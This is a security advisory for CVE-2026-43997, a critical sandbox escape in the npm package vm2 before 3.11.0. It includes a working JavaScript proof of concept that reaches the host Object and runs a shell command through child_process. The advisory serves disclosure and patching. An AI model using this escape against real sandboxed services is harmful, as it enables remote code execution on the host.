# [C] vm2 Access to Host Object Enables Sandbox Escape

## Summary
Severity: Critical
Advisory: GHSA-47x8-96vw-5wg6
CVE: CVE-2026-43997
CWE: CWE-94
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-05-07
Source: https://github.com/advisories/GHSA-47x8-96vw-5wg6
Type: github-advisory

## Affected
- npm: `vm2` — affected >=0 <3.11.0

## Details
### Summary

It is possible to obtain the host `Object`, https://github.com/patriksimek/vm2/commit/ebcfe94ad2f864f0bc35e78cff1d921107cfd160 added some protections, but the implementation is incomplete.

### Details

There are various ways to use the host `Object`, to escape the sandbox, one example would be using  `HostObject.getOwnPropertySymbols` to obtain `Symbol(nodejs.util.inspect.custom)`

### PoC

```js
const g = {}.__lookupGetter__;
const a = Buffer.apply;
const p = a.apply(g, [Buffer, ['__proto__']]);
const o = p.call(p.call(a));
const HObject = o.constructor;
sym = HObject.getOwnPropertySymbols(Buffer.prototype).at(0);

const obj = {
	[sym]: (depth, opt, inspect) => {
		inspect.constructor("return process.getBuiltinModule('child_process').execSync('ls',{stdio:'inherit'})")();
	},
	valueOf: undefined,
	constructor: undefined,
};

WebAssembly.compileStreaming(obj).catch(() => {});
```

### Impact

Sandbox Escape -> RCE

## References
- https://github.com/patriksimek/vm2/security/advisories/GHSA-47x8-96vw-5wg6
- https://nvd.nist.gov/vuln/detail/CVE-2026-43997
- https://github.com/patriksimek/vm2
- https://github.com/patriksimek/vm2/releases/tag/v3.11.0
